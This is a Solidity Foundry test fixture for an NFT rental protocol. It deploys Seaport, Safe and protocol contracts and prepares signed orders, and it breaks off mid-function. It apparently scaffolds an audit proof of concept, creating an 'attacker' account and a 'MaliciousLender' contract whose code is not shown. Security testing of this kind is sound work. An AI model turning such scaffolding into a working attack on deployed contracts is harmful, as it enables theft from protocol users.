    import {Test} from "@forge-std/Test.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {LibString} from "@solady/utils/LibString.sol";
    import {SafeL2} from "@safe-contracts/SafeL2.sol";
    import {Safe} from "@safe-contracts/Safe.sol";
    // import {BaseExternal} from "@test/fixtures/external/BaseExternal.sol";
    import {SafeProxyFactory} from "@safe-contracts/proxies/SafeProxyFactory.sol";
    import {Create2Deployer} from "@src/Create2Deployer.sol";
    import {Kernel, Actions} from "@src/Kernel.sol";
    import {Storage} from "@src/modules/Storage.sol";
    import {PaymentEscrow} from "@src/modules/PaymentEscrow.sol";
    import {Create} from "@src/policies/Create.sol";
    import {Stop} from "@src/policies/Stop.sol";
    import {Factory} from "@src/policies/Factory.sol";
    import {Admin} from "@src/policies/Admin.sol";
    import {Guard} from "@src/policies/Guard.sol";
    import {toRole} from "@src/libraries/KernelUtils.sol";
    import {Proxy} from "@src/proxy/Proxy.sol";
    import {Events} from "@src/libraries/Events.sol";
    import {HandlerContext} from "@safe-contracts/handler/HandlerContext.sol";
    import {CompatibilityFallbackHandler} from "@safe-contracts/handler/CompatibilityFallbackHandler.sol";
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";
    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';
    import {ISignatureValidator} from "@safe-contracts/interfaces/ISignatureValidator.sol";

    import {ProtocolAccount} from "@test/utils/Types.sol";
    import {MockERC20} from "@test/mocks/tokens/standard/MockERC20.sol";
    import {MockERC721} from "@test/mocks/tokens/standard/MockERC721.sol";
    import {MockERC1155} from "@test/mocks/tokens/standard/MockERC1155.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";
    import {ISafe} from "@src/interfaces/ISafe.sol";

    import {Seaport} from "@seaport-core/Seaport.sol";
    import {ConduitController} from "@seaport-core/conduit/ConduitController.sol";
    import {ConduitControllerInterface} from "@seaport-types/interfaces/ConduitControllerInterface.sol";
    import {ConduitInterface} from "@seaport-types/interfaces/ConduitInterface.sol";

    import "@forge-std/console.sol";



    // Deploys all Seaport protocol contracts
    contract External_Seaport is Test {
        // seaport protocol contracts
        Seaport public seaport;
        ConduitController public conduitController;
        ConduitInterface public conduit;

        // conduit owner and key
        Vm.Wallet public conduitOwner;
        bytes32 public conduitKey;

        function setUp() public virtual {
            // generate conduit owner wallet
            conduitOwner = vm.createWallet("conduitOwner");

            // deploy conduit controller
            conduitController = new ConduitController();

            // deploy seaport
            seaport = new Seaport(address(conduitController));

            // create a conduit key (first 20 bytes must be conduit creator)
            conduitKey = bytes32(uint256(uint160(conduitOwner.addr))) << 96;

            // create a new conduit
            vm.prank(conduitOwner.addr);
            address conduitAddress = conduitController.createConduit(
                conduitKey,
                conduitOwner.addr
            );

            // set the conduit address
            conduit = ConduitInterface(conduitAddress);

            // open a channel for seaport on the conduit
            vm.prank(conduitOwner.addr);
            conduitController.updateChannel(address(conduit), address(seaport), true);

            // label the contracts
            vm.label(address(seaport), "Seaport");
            vm.label(address(conduitController), "ConduitController");
            vm.label(address(conduit), "Conduit");
        }
    }

    // Deploys the Create2Deployer contract
    contract External_Create2Deployer is Test {
        Create2Deployer public create2Deployer;

        function setUp() public virtual {
            // Deploy the create2 deployer contract
            create2Deployer = new Create2Deployer();

            // label the contract
            vm.label(address(create2Deployer), "Create2Deployer");
        }
    }

    // Deploys all Gnosis Safe protocol contracts
    contract External_Safe is Test {
        SafeL2 public safeSingleton;
        SafeProxyFactory public safeProxyFactory;

        CompatibilityFallbackHandler public fallbackHandler;

        function setUp() public virtual {
            // Deploy safe singleton contract
            safeSingleton = new SafeL2();

            // Deploy safe proxy factory
            safeProxyFactory = new SafeProxyFactory();

            // Deploy the compatibility token handler
            fallbackHandler = new CompatibilityFallbackHandler();

            // Label the contracts
            vm.label(address(safeSingleton), "SafeSingleton");
            vm.label(address(safeProxyFactory), "SafeProxyFactory");
            vm.label(address(fallbackHandler), "TokenCallbackHandler");
        }
    }

    contract BaseExternal is External_Create2Deployer, External_Seaport, External_Safe {
        // This is an explicit entrypoint for all external contracts that the V3 protocol depends on.
        //
        // It contains logic for:
        // - setup of the Create2Deployer contract
        // - setup of all Seaport protocol contracts
        // - setup of all Gnosis Safe protocol contracts
        //
        // The inheritance chain is as follows:
        // External_Create2Deployer + External_Seaport + External_Safe
        // --> BaseExternal

        function setUp()
            public
            virtual
            override(External_Create2Deployer, External_Seaport, External_Safe)
        {
            // set up dependencies
            External_Create2Deployer.setUp();
            External_Seaport.setUp();
            External_Safe.setUp();
        }
    }

    // Deploys all V3 protocol contracts
    contract Protocol is BaseExternal {
        // Kernel
        Kernel public kernel;

        // Modules
        Storage public STORE;
        PaymentEscrow public ESCRW;

        // Module implementation addresses
        Storage public storageImplementation;
        PaymentEscrow public paymentEscrowImplementation;

        // Policies
        Create public create;
        Stop public stop;
        Factory public factory;
        Admin public admin;
        Guard public guard;

        // Protocol accounts
        Vm.Wallet public rentalSigner;
        Vm.Wallet public deployer;

        // protocol constants
        bytes12 public protocolVersion;
        bytes32 public salt;

        function _deployKernel() internal {
            // abi encode the kernel bytecode and constructor arguments
            bytes memory kernelInitCode = abi.encodePacked(
                type(Kernel).creationCode,
                abi.encode(deployer.addr, deployer.addr)
            );

            // Deploy kernel contract
            vm.prank(deployer.addr);
            kernel = Kernel(create2Deployer.deploy(salt, kernelInitCode));

            // label the contract
            vm.label(address(kernel), "kernel");
        }

        function _deployStorageModule() internal {
            // abi encode the storage bytecode and constructor arguments
            // for the implementation contract
            bytes memory storageImplementationInitCode = abi.encodePacked(
                type(Storage).creationCode,
                abi.encode(address(0))
            );

            // Deploy storage implementation contract
            vm.prank(deployer.addr);
            storageImplementation = Storage(
                create2Deployer.deploy(salt, storageImplementationInitCode)
            );

            // abi encode the storage bytecode and initialization arguments
            // for the proxy contract
            bytes memory storageProxyInitCode = abi.encodePacked(
                type(Proxy).creationCode,
                abi.encode(
                    address(storageImplementation),
                    abi.encodeWithSelector(
                        Storage.MODULE_PROXY_INSTANTIATION.selector,
                        address(kernel)
                    )
                )
            );

            // Deploy storage proxy contract
            vm.prank(deployer.addr);
            STORE = Storage(create2Deployer.deploy(salt, storageProxyInitCode));

            // label the contracts
            vm.label(address(STORE), "STORE");
            vm.label(address(storageImplementation), "STORE_IMPLEMENTATION");
        }

        function _deployPaymentEscrowModule() internal {
            // abi encode the payment escrow bytecode and constructor arguments
            // for the implementation contract
            bytes memory paymentEscrowImplementationInitCode = abi.encodePacked(
                type(PaymentEscrow).creationCode,
                abi.encode(address(0))
            );

            // Deploy payment escrow implementation contract
            vm.prank(deployer.addr);
            paymentEscrowImplementation = PaymentEscrow(
                create2Deployer.deploy(salt, paymentEscrowImplementationInitCode)
            );

            // abi encode the payment escrow bytecode and initialization arguments
            // for the proxy contract
            bytes memory paymentEscrowProxyInitCode = abi.encodePacked(
                type(Proxy).creationCode,
                abi.encode(
                    address(paymentEscrowImplementation),
                    abi.encodeWithSelector(
                        PaymentEscrow.MODULE_PROXY_INSTANTIATION.selector,
                        address(kernel)
                    )
                )
            );

            // Deploy payment escrow contract
            vm.prank(deployer.addr);
            ESCRW = PaymentEscrow(create2Deployer.deploy(salt, paymentEscrowProxyInitCode));

            // label the contracts
            vm.label(address(ESCRW), "ESCRW");
            vm.label(address(paymentEscrowImplementation), "ESCRW_IMPLEMENTATION");
        }

        function _deployCreatePolicy() internal {
            // abi encode the create policy bytecode and constructor arguments
            bytes memory createInitCode = abi.encodePacked(
                type(Create).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy create rental policy contract
            vm.prank(deployer.addr);
            create = Create(create2Deployer.deploy(salt, createInitCode));

            // label the contract
            vm.label(address(create), "CreatePolicy");
        }

        function _deployStopPolicy() internal {
            // abi encode the stop policy bytecode and constructor arguments
            bytes memory stopInitCode = abi.encodePacked(
                type(Stop).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy stop rental policy contract
            vm.prank(deployer.addr);
            stop = Stop(create2Deployer.deploy(salt, stopInitCode));

            // label the contract
            vm.label(address(stop), "StopPolicy");
        }

        function _deployAdminPolicy() internal {
            // abi encode the admin policy bytecode and constructor arguments
            bytes memory adminInitCode = abi.encodePacked(
                type(Admin).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy admin policy contract
            vm.prank(deployer.addr);
            admin = Admin(create2Deployer.deploy(salt, adminInitCode));

            // label the contract
            vm.label(address(admin), "AdminPolicy");
        }

        function _deployGuardPolicy() internal {
            // abi encode the guard policy bytecode and constructor arguments
            bytes memory guardInitCode = abi.encodePacked(
                type(Guard).creationCode,
                abi.encode(address(kernel))
            );

            // Deploy guard policy contract
            vm.prank(deployer.addr);
            guard = Guard(create2Deployer.deploy(salt, guardInitCode));

            // label the contract
            vm.label(address(guard), "GuardPolicy");
        }

        function _deployFactoryPolicy() internal {
            // abi encode the factory policy bytecode and constructor arguments
            bytes memory factoryInitCode = abi.encodePacked(
                type(Factory).creationCode,
                abi.encode(
                    address(kernel),
                    address(stop),
                    address(guard),
                    address(fallbackHandler),
                    address(safeProxyFactory),
                    address(safeSingleton)
                )
            );

            // Deploy factory policy contract
            vm.prank(deployer.addr);
            factory = Factory(create2Deployer.deploy(salt, factoryInitCode));

            // label the contract
            vm.label(address(factory), "FactoryPolicy");
        }

        function _setupKernel() internal {
            // Start impersonating the deployer
            vm.startPrank(deployer.addr);

            // Install modules
            kernel.executeAction(Actions.InstallModule, address(STORE));
            kernel.executeAction(Actions.InstallModule, address(ESCRW));

            // Approve policies
            kernel.executeAction(Actions.ActivatePolicy, address(create));
            kernel.executeAction(Actions.ActivatePolicy, address(stop));
            kernel.executeAction(Actions.ActivatePolicy, address(factory));
            kernel.executeAction(Actions.ActivatePolicy, address(guard));
            kernel.executeAction(Actions.ActivatePolicy, address(admin));

            // Grant `seaport` role to seaport protocol
            kernel.grantRole(toRole("SEAPORT"), address(seaport));

            // Grant `signer` role to the protocol signer to sign off on create payloads
            kernel.grantRole(toRole("CREATE_SIGNER"), rentalSigner.addr);

            // Grant 'admin_admin` role to the address which can conduct admin operations on the protocol
            kernel.grantRole(toRole("ADMIN_ADMIN"), deployer.addr);

            // Grant 'guard_admin` role to the address which can toggle hooks
            kernel.grantRole(toRole("GUARD_ADMIN"), deployer.addr);

            // Grant `stop_admin` role to the address which can skim funds from the payment escrow
            kernel.grantRole(toRole("STOP_ADMIN"), deployer.addr);

            // Stop impersonating the deployer
            vm.stopPrank();
        }

        function setUp() public virtual override {
            // setup dependencies
            super.setUp();

            // create the rental signer address and private key
            rentalSigner = vm.createWallet("rentalSigner");

            // create the deployer address and private key
            deployer = vm.createWallet("deployer");

            // contract salts (using 0x000000000000000000000100 to represent a version 1.0.0 of each contract)
            protocolVersion = 0x000000000000000000000100;
            salt = create2Deployer.generateSaltWithSender(deployer.addr, protocolVersion);

            // deploy kernel
            _deployKernel();

            // Deploy payment escrow
            _deployPaymentEscrowModule();

            // Deploy rental storage
            _deployStorageModule();

            // deploy create policy
            _deployCreatePolicy();

            // deploy stop policy
            _deployStopPolicy();

            // deploy admin policy
            _deployAdminPolicy();

            // Deploy guard policy
            _deployGuardPolicy();

            // deploy rental factory
            _deployFactoryPolicy();

            // intialize the kernel
            _setupKernel();
        }
    }


    // Creates test accounts to interact with the V3 protocol
    // Borrowed from test/fixtures/protocol/AccountCreator
    contract AccountCreator is Protocol {
        // Protocol accounts for testing
        ProtocolAccount public alice;
        ProtocolAccount public bob;
        ProtocolAccount public carol;
        ProtocolAccount public dan;
        ProtocolAccount public eve;
        ProtocolAccount public attacker;
        MaliciousLender maliciousLenderContract;

        // Mock tokens for testing
        MockERC20[] public erc20s;
        MockERC721[] public erc721s;
        MockERC1155[] public erc1155s;

        function setUp() public virtual override {
            super.setUp();

            // deploy 3 erc20 tokens, 3 erc721 tokens, and 3 erc1155 tokens
            _deployTokens(3);

            // instantiate all wallets and deploy rental safes for each
            alice = _fundWalletAndDeployRentalSafe("alice");
            bob = _fundWalletAndDeployRentalSafe("bob");
            carol = _fundWalletAndDeployRentalSafe("carol");
            dan = _fundWalletAndDeployRentalSafe("dan");
            eve = _fundWalletAndDeployRentalSafe("eve");
            attacker = _fundWalletAndDeployRentalSafe("attacker");

            vm.prank(attacker.addr);
            maliciousLenderContract = new MaliciousLender(); // attacker.addr will be the owner of this contract


        }

        function _deployTokens(uint256 numTokens) internal {
            for (uint256 i; i < numTokens; i++) {
                _deployErc20Token();
                _deployErc721Token();
                _deployErc1155Token();
            }
        }

        function _deployErc20Token() internal returns (uint256 i) {
            // save the token's index
            i = erc20s.length;

            // deploy the mock token
            MockERC20 token = new MockERC20();

            // push the token to the array of mocks
            erc20s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC20_", LibString.toString(i)));
        }

        function _deployErc721Token() internal returns (uint256 i) {
            // save the token's index
            i = erc721s.length;

            // deploy the mock token
            MockERC721 token = new MockERC721();

            // push the token to the array of mocks
            erc721s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC721_", LibString.toString(i)));
        }

        function _deployErc1155Token() internal returns (uint256 i) {
            // save the token's index
            i = erc1155s.length;

            // deploy the mock token
            MockERC1155 token = new MockERC1155();

            // push the token to the array of mocks
            erc1155s.push(token);

            // set the token label with the index
            vm.label(address(token), string.concat("MERC1155_", LibString.toString(i)));
        }

        function _deployRentalSafe(
            address owner,
            string memory name
        ) internal returns (address safe) {
            // Deploy a 1/1 rental safe
            address[] memory owners = new address[](1);
            owners[0] = owner;
            safe = factory.deployRentalSafe(owners, 1);

        }

        function _fundWalletAndDeployRentalSafe(
            string memory name
        ) internal returns (ProtocolAccount memory account) {
            // create a wallet with a address, public key, and private key
            Vm.Wallet memory wallet = vm.createWallet(name);

            // deploy a rental safe for the address
            address rentalSafe = _deployRentalSafe(wallet.addr, name);

            // fund the wallet with ether, all erc20s, and approve the conduit for erc20s, erc721s, erc1155s
            _allocateTokensAndApprovals(wallet.addr, 10000);

            // create an account
            account = ProtocolAccount({
                addr: wallet.addr,
                safe: SafeL2(payable(rentalSafe)),
                publicKeyX: wallet.publicKeyX,
                publicKeyY: wallet.publicKeyY,
                privateKey: wallet.privateKey
            });

        }



        function _allocateTokensAndApprovals(address to, uint128 amount) internal {
            // deal ether to the recipient
            vm.deal(to, amount);

            // mint all erc20 tokens to the recipient
            for (uint256 i = 0; i < erc20s.length; ++i) {
                erc20s[i].mint(to, amount);
            }

            // set token approvals
            _setApprovals(to);
        }

        function _setApprovals(address owner) internal {
            // impersonate the owner address
            vm.startPrank(owner);

            // set all approvals for erc20 tokens
            for (uint256 i = 0; i < erc20s.length; ++i) {
                erc20s[i].approve(address(conduit), type(uint256).max);
            }

            // set all approvals for erc721 tokens
            for (uint256 i = 0; i < erc721s.length; ++i) {
                erc721s[i].setApprovalForAll(address(conduit), true);
            }

            // set all approvals for erc1155 tokens
            for (uint256 i = 0; i < erc1155s.length; ++i) {
                erc1155s[i].setApprovalForAll(address(conduit), true);
            }

            // stop impersonating
            vm.stopPrank();
        }
    }


    // Sets up logic in the test engine related to order creation
    // Borrowed from test/fixtures/engine/OrderCreator
    contract OrderCreator is AccountCreator {
        using OfferItemLib for OfferItem;
        using ConsiderationItemLib for ConsiderationItem;
        using OrderComponentsLib for OrderComponents;
        using OrderLib for Order;
        using ECDSA for bytes32;

        // defines a config for a standard order component
        string constant STANDARD_ORDER_COMPONENTS = "standard_order_components";

        struct OrderToCreate {
            ProtocolAccount offerer;
            OfferItem[] offerItems;
            ConsiderationItem[] considerationItems;
            OrderMetadata metadata;
        }

        // keeps track of tokens used during a test
        uint256[] usedOfferERC721s;
        uint256[] usedOfferERC1155s;

        uint256[] usedConsiderationERC721s;
        uint256[] usedConsiderationERC1155s;

        // components of an order
        OrderToCreate orderToCreate;

        function setUp() public virtual override {
            super.setUp();

            // Define a standard OrderComponents struct which is ready for
            // use with the Create Policy and the protocol conduit contract
            OrderComponentsLib
                .empty()
                .withOrderType(SeaportOrderType.FULL_RESTRICTED)
                .withZone(address(create))
                .withStartTime(block.timestamp)
                .withEndTime(block.timestamp + 100)
                .withSalt(123456789)
                .withConduitKey(conduitKey)
                .saveDefault(STANDARD_ORDER_COMPONENTS);

            // for each test token, create a storage slot
            for (uint256 i = 0; i < erc721s.length; i++) {
                usedOfferERC721s.push();
                usedConsiderationERC721s.push();

                usedOfferERC1155s.push();
                usedConsiderationERC1155s.push();
            }
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                                Order Creation                               //
        /////////////////////////////////////////////////////////////////////////////////

        // creates an order based on the provided context. The defaults on this order
        // are good for most test cases.
        function createOrder(
            ProtocolAccount memory offerer,
            OrderType orderType,
            uint256 erc721Offers,
            uint256 erc1155Offers,
            uint256 erc20Offers,
            uint256 erc721Considerations,
            uint256 erc1155Considerations,
            uint256 erc20Considerations
        ) internal {
            // require that the number of offer items or consideration items
            // dont exceed the number of test tokens
            require(
                erc721Offers <= erc721s.length &&
                    erc721Offers <= erc1155s.length &&
                    erc20Offers <= erc20s.length,
                "TEST: too many offer items defined"
            );
            require(
                erc721Considerations <= erc721s.length &&
                    erc1155Considerations <= erc1155s.length &&
                    erc20Considerations <= erc20s.length,
                "TEST: too many consideration items defined"
            );

            // create the offerer
            _createOfferer(offerer);

            // add the offer items
            _createOfferItems(erc721Offers, erc1155Offers, erc20Offers);

            // create the consideration items
            _createConsiderationItems(
                erc721Considerations,
                erc1155Considerations,
                erc20Considerations
            );

            // Create order metadata
            _createOrderMetadata(orderType);
        }

        // Creates an offerer on the order to create
        function _createOfferer(ProtocolAccount memory offerer) private {
            orderToCreate.offerer = offerer;
        }

        // Creates offer items which are good for most tests
        function _createOfferItems(
            uint256 erc721Offers,
            uint256 erc1155Offers,
            uint256 erc20Offers
        ) private {
            // generate the ERC721 offer items
            for (uint256 i = 0; i < erc721Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC721)
                        .withToken(address(erc721s[i]))
                        .withIdentifierOrCriteria(usedOfferERC721s[i])
                        .withStartAmount(1)
                        .withEndAmount(1)
                );

                // mint an erc721 to the offerer
                erc721s[i].mint(orderToCreate.offerer.addr);

                // update the used token so it cannot be used again in the same test
                usedOfferERC721s[i]++;
            }

            // generate the ERC1155 offer items
            for (uint256 i = 0; i < erc1155Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(erc1155s[i]))
                        .withIdentifierOrCriteria(usedOfferERC1155s[i])
                        .withStartAmount(100)
                        .withEndAmount(100)
                );

                // mint an erc1155 to the offerer
                erc1155s[i].mint(orderToCreate.offerer.addr, 100);

                // update the used token so it cannot be used again in the same test
                usedOfferERC1155s[i]++;
            }

            // generate the ERC20 offer items
            for (uint256 i = 0; i < erc20Offers; ++i) {
                // create the offer item
                orderToCreate.offerItems.push(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC20)
                        .withToken(address(erc20s[i]))
                        .withStartAmount(100)
                        .withEndAmount(100)
                );
            }
        }

        // Creates consideration items that are good for most tests
        function _createConsiderationItems(
            uint256 erc721Considerations,
            uint256 erc1155Considerations,
            uint256 erc20Considerations
        ) private {
            // generate the ERC721 consideration items
            for (uint256 i = 0; i < erc721Considerations; ++i) {
                // create the consideration item, and set the recipient as the offerer's
                // rental safe address
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(orderToCreate.offerer.safe))
                        .withItemType(ItemType.ERC721)
                        .withToken(address(erc721s[i]))
                        .withIdentifierOrCriteria(usedConsiderationERC721s[i])
                        .withStartAmount(1)
                        .withEndAmount(1)
                );

                // update the used token so it cannot be used again in the same test
                usedConsiderationERC721s[i]++;
            }

            // generate the ERC1155 consideration items
            for (uint256 i = 0; i < erc1155Considerations; ++i) {
                // create the consideration item, and set the recipient as the offerer's
                // rental safe address
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(orderToCreate.offerer.safe))
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(erc1155s[i]))
                        .withIdentifierOrCriteria(usedConsiderationERC1155s[i])
                        .withStartAmount(100)
                        .withEndAmount(100)
                );

                // update the used token so it cannot be used again in the same test
                usedConsiderationERC1155s[i]++;
            }

            // generate the ERC20 consideration items
            for (uint256 i = 0; i < erc20Considerations; ++i) {
                // create the offer item
                orderToCreate.considerationItems.push(
                    ConsiderationItemLib
                        .empty()
                        .withRecipient(address(ESCRW))
                        .withItemType(ItemType.ERC20)
                        .withToken(address(erc20s[i]))
                        .withStartAmount(100)
                        .withEndAmount(100)
                );
            }
        }

        // Creates a order metadata that is good for most tests
        function _createOrderMetadata(OrderType orderType) private {
            // Create order metadata
            orderToCreate.metadata.orderType = orderType;
            orderToCreate.metadata.rentDuration = 500;
            orderToCreate.metadata.emittedExtraData = new bytes(0);
        }

        // creates a signed seaport order ready to be fulfilled by a renter
        function _createSignedOrder(
            ProtocolAccount memory _offerer,
            OfferItem[] memory _offerItems,
            ConsiderationItem[] memory _considerationItems,
            OrderMetadata memory _metadata
        ) private view returns (Order memory order, bytes32 orderHash) {
            // Build the order components
            OrderComponents memory orderComponents = OrderComponentsLib
                .fromDefault(STANDARD_ORDER_COMPONENTS)
                .withOfferer(_offerer.addr)
                .withOffer(_offerItems)
                .withConsideration(_considerationItems)
                .withZoneHash(create.getOrderMetadataHash(_metadata))
                .withCounter(seaport.getCounter(_offerer.addr));

            // generate the order hash
            orderHash = seaport.getOrderHash(orderComponents);

            // generate the signature for the order components
            bytes memory signature = _signSeaportOrder(_offerer.privateKey, orderHash);

            // create the order, but dont provide a signature if its a PAYEE order.
            // Since PAYEE orders are fulfilled by the offerer of the order, they
            // dont need a signature.
            if (_metadata.orderType == OrderType.PAYEE) {
                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());
            } else {
                order = OrderLib
                    .empty()
                    .withParameters(orderComponents.toOrderParameters())
                    .withSignature(signature);
            }
        }

        function _signSeaportOrder(
            uint256 signerPrivateKey,
            bytes32 orderHash
        ) private view returns (bytes memory signature) {
            // fetch domain separator from seaport
            (, bytes32 domainSeparator, ) = seaport.information();

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                signerPrivateKey,
                domainSeparator.toTypedDataHash(orderHash)
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                               Order Amendments                              //
        /////////////////////////////////////////////////////////////////////////////////

        function resetOrderToCreate() internal {
            delete orderToCreate;
        }

        function withOfferer(ProtocolAccount memory _offerer) internal {
            orderToCreate.offerer = _offerer;
        }

        function resetOfferer() internal {
            delete orderToCreate.offerer;
        }

        function withReplacedOfferItems(OfferItem[] memory _offerItems) internal {
            // reset all current offer items
            resetOfferItems();

            // add the new offer items to storage
            for (uint256 i = 0; i < _offerItems.length; i++) {
                orderToCreate.offerItems.push(_offerItems[i]);
            }
        }

        function withOfferItem(OfferItem memory offerItem) internal {
            orderToCreate.offerItems.push(offerItem);
        }

        function resetOfferItems() internal {
            delete orderToCreate.offerItems;
        }

        function popOfferItem() internal {
            orderToCreate.offerItems.pop();
        }

        function withReplacedConsiderationItems(
            ConsiderationItem[] memory _considerationItems
        ) internal {
            // reset all current consideration items
            resetConsiderationItems();

            // add the new consideration items to storage
            for (uint256 i = 0; i < _considerationItems.length; i++) {
                orderToCreate.considerationItems.push(_considerationItems[i]);
            }
        }

        function withConsiderationItem(ConsiderationItem memory considerationItem) internal {
            orderToCreate.considerationItems.push(considerationItem);
        }

        function resetConsiderationItems() internal {
            delete orderToCreate.considerationItems;
        }

        function popConsiderationItem() internal {
            orderToCreate.considerationItems.pop();
        }

        function withHooks(Hook[] memory hooks) internal {
            // delete the current metatdata hooks
            delete orderToCreate.metadata.hooks;

            // add each metadata hook to storage
            for (uint256 i = 0; i < hooks.length; i++) {
                orderToCreate.metadata.hooks.push(hooks[i]);
            }
        }

        function withOrderMetadata(OrderMetadata memory _metadata) internal {
            // update the static metadata parameters
            orderToCreate.metadata.orderType = _metadata.orderType;
            orderToCreate.metadata.rentDuration = _metadata.rentDuration;
            orderToCreate.metadata.emittedExtraData = _metadata.emittedExtraData;

            // update the hooks
            withHooks(_metadata.hooks);
        }

        function resetOrderMetadata() internal {
            delete orderToCreate.metadata;
        }

        /////////////////////////////////////////////////////////////////////////////////
        //                              Order Finalization                             //
        /////////////////////////////////////////////////////////////////////////////////

        function finalizeOrder()
            internal
            returns (Order memory, bytes32, OrderMetadata memory)
        {
            // create and sign the order
            (Order memory order, bytes32 orderHash) = _createSignedOrder(
                orderToCreate.offerer,
                orderToCreate.offerItems,
                orderToCreate.considerationItems,
                orderToCreate.metadata
            );

            // pull order metadata into memory
            OrderMetadata memory metadata = orderToCreate.metadata;

            // clear structs
            resetOrderToCreate();

            return (order, orderHash, metadata);
        }
    }


    // Sets up logic in the test engine related to order fulfillment
    // Borrowed from test/fixtures/engine/OrderFulfiller
    contract OrderFulfiller is OrderCreator {
        using ECDSA for bytes32;

        struct OrderToFulfill {
            bytes32 orderHash;
            RentPayload payload;
            AdvancedOrder advancedOrder;
        }

        // components of a fulfillment
        ProtocolAccount fulfiller;
        OrderToFulfill[] ordersToFulfill;
        Fulfillment[] seaportMatchOrderFulfillments;
        FulfillmentComponent[][] seaportOfferFulfillments;
        FulfillmentComponent[][] seaportConsiderationFulfillments;
        address seaportRecipient;

        /////////////////////////////////////////////////////////////////////////////////
        //                             Fulfillment Creation                            //
        /////////////////////////////////////////////////////////////////////////////////

        // creates an order fulfillment
        function createOrderFulfillment(
            ProtocolAccount memory _fulfiller,
            Order memory order,
            bytes32 orderHash,
            OrderMetadata memory metadata
        ) internal {
            // set the fulfiller account
            fulfiller = _fulfiller;

            // set the recipient of any offer items after an order is fulfilled. If the fulfillment is via
            // `matchAdvancedOrders`, then any unspent offer items will go to this address as well
            seaportRecipient = address(_fulfiller.safe);

            // get a pointer to a new order to fulfill
            OrderToFulfill storage orderToFulfill = ordersToFulfill.push();

            // create an order fulfillment
            OrderFulfillment memory fulfillment = OrderFulfillment(address(_fulfiller.safe));

            // add the order hash and fulfiller
            orderToFulfill.orderHash = orderHash;

            // create rental zone payload data
            _createRentalPayload(
                orderToFulfill.payload,
                RentPayload(fulfillment, metadata, block.timestamp + 100, _fulfiller.addr)
            );

            // generate the signature for the payload
            bytes memory signature = _signProtocolOrder(
                rentalSigner.privateKey,
                create.getRentPayloadHash(orderToFulfill.payload)
            );

            // create an advanced order from the order. Pass the rental
            // payload as extra data
            _createAdvancedOrder(
                orderToFulfill.advancedOrder,
                AdvancedOrder(
                    order.parameters,
                    1,
                    1,
                    order.signature,
                    abi.encode(orderToFulfill.payload, signature)
                )
            );
        }

        function _createOrderFulfiller(
            ProtocolAccount storage storageFulfiller,
            ProtocolAccount memory _fulfiller
        ) private {
            storageFulfiller.addr = _fulfiller.addr;
            storageFulfiller.safe = _fulfiller.safe;
            storageFulfiller.publicKeyX = _fulfiller.publicKeyX;
            storageFulfiller.publicKeyY = _fulfiller.publicKeyY;
            storageFulfiller.privateKey = _fulfiller.privateKey;
        }

        function _createOrderFulfillment(
            OrderFulfillment storage storageFulfillment,
            OrderFulfillment memory fulfillment
        ) private {
            storageFulfillment.recipient = fulfillment.recipient;
        }

        function _createOrderMetadata(
            OrderMetadata storage storageMetadata,
            OrderMetadata memory metadata
        ) private {
            // Create order metadata in storage
            storageMetadata.orderType = metadata.orderType;
            storageMetadata.rentDuration = metadata.rentDuration;
            storageMetadata.emittedExtraData = metadata.emittedExtraData;

            // dynamically push the hooks from memory to storage
            for (uint256 i = 0; i < metadata.hooks.length; i++) {
                storageMetadata.hooks.push(metadata.hooks[i]);
            }
        }

        function _createRentalPayload(
            RentPayload storage storagePayload,
            RentPayload memory payload
        ) private {
            // set payload fulfillment on the order to fulfill
            _createOrderFulfillment(storagePayload.fulfillment, payload.fulfillment);

            // set payload metadata on the order to fulfill
            _createOrderMetadata(storagePayload.metadata, payload.metadata);

            // set payload expiration on the order to fulfill
            storagePayload.expiration = payload.expiration;

            // set payload intended fulfiller on the order to fulfill
            storagePayload.intendedFulfiller = payload.intendedFulfiller;
        }

        function _createAdvancedOrder(
            AdvancedOrder storage storageAdvancedOrder,
            AdvancedOrder memory advancedOrder
        ) private {
            // create the order parameters on the order to fulfill
            _createOrderParameters(storageAdvancedOrder.parameters, advancedOrder.parameters);

            // create the rest of the static parameters on the order to fulfill
            storageAdvancedOrder.numerator = advancedOrder.numerator;
            storageAdvancedOrder.denominator = advancedOrder.denominator;
            storageAdvancedOrder.signature = advancedOrder.signature;
            storageAdvancedOrder.extraData = advancedOrder.extraData;
        }

        function _createOrderParameters(
            OrderParameters storage storageOrderParameters,
            OrderParameters memory orderParameters
        ) private {
            // create the static order parameters for the order to fulfill
            storageOrderParameters.offerer = orderParameters.offerer;
            storageOrderParameters.zone = orderParameters.zone;
            storageOrderParameters.orderType = orderParameters.orderType;
            storageOrderParameters.startTime = orderParameters.startTime;
            storageOrderParameters.endTime = orderParameters.endTime;
            storageOrderParameters.zoneHash = orderParameters.zoneHash;
            storageOrderParameters.salt = orderParameters.salt;
            storageOrderParameters.conduitKey = orderParameters.conduitKey;
            storageOrderParameters.totalOriginalConsiderationItems = orderParameters
                .totalOriginalConsiderationItems;

            // create the dynamic order parameters for the order to fulfill
            for (uint256 i = 0; i < orderParameters.offer.length; i++) {
                storageOrderParameters.offer.push(orderParameters.offer[i]);
            }
